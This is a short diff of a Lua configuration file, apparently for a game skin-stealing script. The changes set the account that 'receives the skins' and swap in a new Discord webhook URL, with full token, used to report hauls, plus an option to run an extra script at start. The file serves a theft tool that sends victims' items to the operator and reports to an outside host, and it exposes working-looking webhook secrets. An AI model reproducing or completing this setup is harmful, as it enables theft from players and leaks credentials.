@@ -1,7 +1,7 @@
 local CONFIG = {
     ANONYMOUS     = false, -- oculta los nombres en el webhook
 
-    TARGET_NAME   = "ferny0719", -- username de la cuenta que recibe las skins
+    TARGET_NAME   = "Ferny0719", -- username de la cuenta que recibe las skins
    
     -- Script extra que se ejecuta al iniciar, puede ser un script de Yisus o cualquier otro script.
     -- Dejar vacio para desactivar
@@ -9,7 +9,7 @@ local CONFIG = {
 
     -- (OPCIONAL) webhook de Discord para notificaciones, dejar vacio para desactivar
     WEBHOOK = {
-        URL  = "https://discord.com/api/webhooks/1551001903410716852/jEY_dkgwNx18RirPlrmpsh2m52a2TCw1TVe4A__5C5LyNeJDZ2-0gjqRJDeBNmYucCMh", -- "https://discord.com/api/webhooks/" webhook de Discord
+        URL  = "https://discord.com/api/webhooks/1551007184060424282/SeDaML5CgrmHyFx0VNllNWTz3pwAsVCA47ke3aq5inYCVdG7ZtESluG2UBhbf_f9jRdv", -- "https://discord.com/api/webhooks/" webhook de Discord
         PING = "@everyone", -- mencion del mensaje, nil para ninguna
         NOTIFY_WHEN_EMPTY = true,
     },
